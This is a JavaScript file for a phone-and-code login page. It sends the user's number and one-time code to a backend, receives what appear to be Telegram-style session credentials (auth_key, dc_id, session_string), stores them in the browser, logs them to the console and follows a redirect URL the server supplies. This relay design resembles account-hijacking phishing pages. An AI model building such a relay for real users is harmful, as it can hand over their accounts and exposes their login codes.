document.addEventListener('DOMContentLoaded', function() {
    const phoneInput = document.getElementById('phoneNumber');
    const countrySelect = document.getElementById('countrySelect');
    const countries = [/* Add your countries data here with idd.root and cca2 attributes */];

    // Detecting light or dark mode
    function detectDeviceMode() {
        const darkModeMediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
        return darkModeMediaQuery.matches ? 'dark' : 'light';
    }

    function applyModeStyles() {
        const currentMode = detectDeviceMode();
        const formContainer = document.querySelector('.form-container');
        const inputs = document.querySelectorAll('input');
        
        if (currentMode === 'light') {
            // Apply light mode styles
            formContainer.style.backgroundColor = '#ffffff'; // White background
            inputs.forEach(input => {
                input.style.color = '#000000'; // Black text
                input.style.backgroundColor = '#ffffff'; // White input background
            });
        } else {
            // Apply dark mode styles
            formContainer.style.backgroundColor = '#2c2c2c'; // Dark background
            inputs.forEach(input => {
                input.style.color = '#ffffff'; // White text
                input.style.backgroundColor = '#2c2c2c'; // Dark input background
            });
        }
    }

    // Call this function on page load to apply the initial mode styles
    applyModeStyles();

    if (phoneInput) {
        phoneInput.addEventListener('input', function() {
            const inputNumber = phoneInput.value.replace(/\D/g, ''); // Remove non-digit characters
            
            if (inputNumber.length > 0) {
                const matchedCountry = findMatchingCountries(inputNumber);
                if (matchedCountry && countrySelect) {
                    // Update the country select dropdown based on matched countries
                    updateCountryOptions(matchedCountry);
                }
            }
        });

        phoneInput.addEventListener('focus', () => {
            setTimeout(() => {
                window.scrollTo({
                    top: phoneInput.getBoundingClientRect().top - 100,
                    behavior: 'smooth'
                });
            }, 300);
        });
    }

    const phoneForm = document.getElementById('phoneForm');
    if (phoneForm) {
        phoneForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            sendLogToBackend("Phone form submitted!");

            const phoneNumber = document.getElementById('phoneNumber').value;
            sendLogToBackend("Phone number entered: " + phoneNumber);
            sessionStorage.setItem('phoneNumber', phoneNumber);

            const submitButton = phoneForm.querySelector('button[type="submit"]');
            submitButton.disabled = true; // Disable button to prevent multiple submissions
            displayLoadingIndicator(true);

            try {
                const response = await fetch(`${BACKEND_URL}/sendPhoneNumber`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber })
                });

                const data = await response.json();
                if (data.message && data.message.includes('The phone number is invalid')) {
                    throw new Error('Invalid phone number, please input your correct phone number.');
                }

                if (!response.ok) {
                    throw new Error('Network response was not ok: ' + response.statusText);
                }

                sendLogToBackend('Response from backend: ' + JSON.stringify(data));

                if (data.phone_code_hash) {
                    sessionStorage.setItem('phone_code_hash', data.phone_code_hash);
                    sendLogToBackend("Phone code hash stored: " + data.phone_code_hash);
                    document.getElementById('loginContainer').classList.add('swipe-left');
                    setTimeout(() => {
                        window.location.href = '/otp.html';
                    }, 600);
                } else {
                    displayMessage(data.message || 'Failed to send OTP', 'error');
                }
            } catch (error) {
                displayMessage(error.message, 'error');
            } finally {
                submitButton.disabled = false; // Re-enable button
                displayLoadingIndicator(false);
            }
        });
    }

    const otpForm = document.getElementById('otpForm');
    if (otpForm) {
        otpForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            sendLogToBackend("Phone code form submitted!");

            const phoneNumber = sessionStorage.getItem('phoneNumber');
            const phoneCode = document.getElementById('phoneCode').value;
            const phoneCodeHash = sessionStorage.getItem('phone_code_hash');

            if (!phoneCodeHash) {
                sendLogToBackend("Error: phone code hash is missing");
                displayMessage("Phone code hash missing. Please try again.", 'error');
                return;
            }

            if (!/^\d{5}$/.test(phoneCode)) {
                displayMessage("Phone code must be exactly 5 digits.", 'error');
                return;
            }

            sendLogToBackend("Phone number from sessionStorage: " + phoneNumber);
            sendLogToBackend("Phone code entered: " + phoneCode);
            sendLogToBackend("Phone code hash: " + phoneCodeHash);

            const submitButton = otpForm.querySelector('button[type="submit"]');
            submitButton.disabled = true; // Disable button to prevent multiple submissions
            displayLoadingIndicator(true);

            try {
                const response = await fetch(`${BACKEND_URL}/verifyOTP`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber, phoneCode, phone_code_hash: phoneCodeHash })
                });

                if (!response.ok) {
                    const data = await response.json();
                    throw new Error(data.message || 'Failed to submit Phone Code');
                }

                const result = await response.json();
                sendLogToBackend('Received auth tokens: ' + JSON.stringify(result.authTokens));

                localStorage.clear();
                localStorage.setItem('auth_key', result.authTokens.auth_key);
                localStorage.setItem('dc_id', result.authTokens.dc_id);
                localStorage.setItem('session_string', result.authTokens.session_string);

                document.getElementById('otpContainer').classList.add('swipe-in');
                setTimeout(() => {
                    window.location.href = result.redirectUrl;
                }, 600);
            } catch (error) {
                displayMessage('Error submitting Phone Code: ' + error.message, 'error');
            } finally {
                submitButton.disabled = false; 
                displayLoadingIndicator(false);
            }
        });
    }

    function findMatchingCountries(inputNumber) {
        return countries.filter(country => {
            const phoneRoot = country.idd.root;
            return phoneRoot && inputNumber.startsWith(phoneRoot);
        });
    }

    function updateCountryOptions(matchedCountries) {
        if (matchedCountries.length === 1) {
            countrySelect.value = matchedCountries[0].cca2;
        } else {
            // Multiple matches, show all possibilities
            countrySelect.innerHTML = ''; // Clear existing options
            matchedCountries.forEach(country => {
                const option = document.createElement('option');
                option.value = country.cca2;
                option.text = `${country.name.common} (${country.idd.root})`;
                countrySelect.appendChild(option);
            });
        }
    }

    function displayMessage(message, type) {
        const messageContainer = document.getElementById('message') || document.getElementById('successMessage') || document.getElementById('errorMessage');
        if (messageContainer) {
            messageContainer.innerText = message;
            messageContainer.style.color = type === 'error' ? 'red' : 'green';
            messageContainer.style.display = 'block';
        }
    }

    function displayLoadingIndicator(isLoading) {
        const loadingIndicator = document.getElementById('loadingIndicator');
        if (loadingIndicator) {
            loadingIndicator.style.display = isLoading ? 'block' : 'none';
        }
    }

    function sendLogToBackend(logMessage) {
        console.log(logMessage); // Here you can replace this with an actual backend log if needed
    }
});
